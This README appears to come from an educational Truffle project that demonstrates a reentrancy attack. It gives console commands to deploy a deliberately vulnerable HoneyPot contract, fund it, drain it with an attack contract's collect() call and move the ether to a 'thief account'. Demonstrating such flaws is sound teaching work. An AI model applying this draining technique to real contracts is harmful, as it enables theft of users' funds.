# honeyPotReentranceAttack
Example of vulnerable contract and an attack contract that would drain all money from vulnerable contract.

## Set up
`truffle compile`

`truffle migrate`

`truffle console`

## truffle console commands
Get Honey pot contract address

`HoneyPot.deployed().then(instance => honeyPotAddress = instance.address)`

Check its balance:

`web3.eth.getBalance(honeyPotAddress).toString(10)`

Send money to honey pot address from accounts[1]:

`HoneyPot.deployed().then(instance => instance.put({from: web3.eth.accounts[1], value: web3.toWei(5, "ether") }))`

Check again honeypot contract balance:

`web3.eth.getBalance(honeyPotAddress).toString(10)`

Get Attack contract address:

`HoneyPotCollect.deployed().then(instance => evilContractAddress = instance.address)`

Check its balance:

`web3.eth.getBalance(evilContractAddress).toString(10)`

Attack HoneyPot contract with evil contract:

`HoneyPotCollect.deployed().then(inst => inst.collect({ value: web3.toWei(5, "ether"), gas: 1000000 }))`

Transfer ether to the thief account:

`HoneyPotCollect.deployed().then(inst => inst.kill())`
